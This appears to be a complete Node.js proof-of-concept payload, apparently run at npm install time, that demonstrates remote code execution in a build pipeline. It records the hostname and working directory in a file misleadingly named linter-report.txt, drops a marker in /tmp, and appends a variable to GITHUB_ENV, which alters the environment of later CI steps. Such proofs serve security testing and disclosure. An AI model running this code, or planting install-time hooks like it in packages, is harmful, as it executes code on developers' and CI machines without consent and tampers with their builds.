const fs = require('fs');
const os = require('os');
const base = process.env.INIT_CWD || process.cwd();
const info = 'RCE_PROVEN_FROM_ARTIFACT install_time=' + new Date().toISOString() +
  ' host=' + os.hostname() + ' cwd=' + process.cwd();
console.log('ADP_RCE ' + info);
fs.writeFileSync(base + '/linter-report.txt', info + '\n');
try { fs.appendFileSync(process.env.GITHUB_ENV, 'ADP_RCE_ENV=1\n'); } catch (e) {}
fs.writeFileSync('/tmp/ADP_RCE_MARKER', info);
